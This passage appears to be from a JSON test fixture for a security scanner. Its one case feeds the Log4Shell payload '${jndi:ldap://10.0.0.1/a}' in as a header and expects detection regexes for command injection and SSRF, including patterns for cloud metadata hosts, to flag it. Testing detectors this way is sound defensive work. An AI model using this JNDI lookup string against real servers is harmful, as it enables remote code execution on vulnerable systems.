  "cases": [
    {
      "id": "log4shell_jndi_ldap",
      "input": {
        "content": "${jndi:ldap://10.0.0.1/a}",
        "context": "header"
      },
      "expected": {
        "is_threat": true,
        "threat_score": 1.0,
        "threats": [
          {
            "type": "regex",
            "pattern": "(?i)\\$\\{(?:jndi:(?:ldap|rmi|dns)://|\\$?\\{?(?:lower|upper):j\\}ndi|::-j\\}ndi)",
            "match": "${jndi:ldap://",
            "position": 0,
            "category": "cmd_injection",
            "weight": 1.0
          },
          {
            "type": "regex",
            "pattern": "\\$\\((?:[^()\\\\\\n]|\\\\.)*\\)|\\$\\{(?:[^{}\\\\\\n]|\\\\.)*\\}",
            "match": "${jndi:ldap://10.0.0.1/a}",
            "position": 0,
            "category": "cmd_injection",
            "weight": 1.0
          },
          {
            "type": "regex",
            "pattern": "(?:^|\\s|/)(?:(?<=://)[^\\s/@]*@)?(?:localhost\\.?|127\\.0\\.0\\.1|0\\.0\\.0\\.0|\\[::(?:\\d*)\\]|\\[::ffff:127\\.0\\.0\\.1\\]|169\\.254(?:\\.\\d{1,3}){2}|192\\.168(?:\\.\\d{1,3}){2}|10(?:\\.\\d{1,3}){3}|172\\.(?:1[6-9]|2[0-9]|3[01])(?:\\.\\d{1,3}){2}|metadata\\.google\\.internal|metadata\\.goog|100\\.100\\.100\\.200)(?::\\d+)?(?:\\s|$|/)",
            "match": "/10.0.0.1/",
            "position": 13,
            "category": "ssrf",
            "weight": 1.0
          },
          {
            "type": "regex",
            "pattern": "://(?:[^/@\\s]*@)?((?:0[xX][0-9a-fA-F]+|0[0-7]+|[1-9]\\d*|0)(?:\\.(?:0[xX][0-9a-fA-F]+|0[0-7]+|[1-9]\\d*|0)){0,3})(?=[:/\\s]|$)",
            "match": "://10.0.0.1",
            "position": 11,
            "category": "ssrf",
            "weight": 1.0
          }
        ],
        "original_length": 25,
        "processed_length": 25,
        "detection_method": "enhanced"
      }
    },
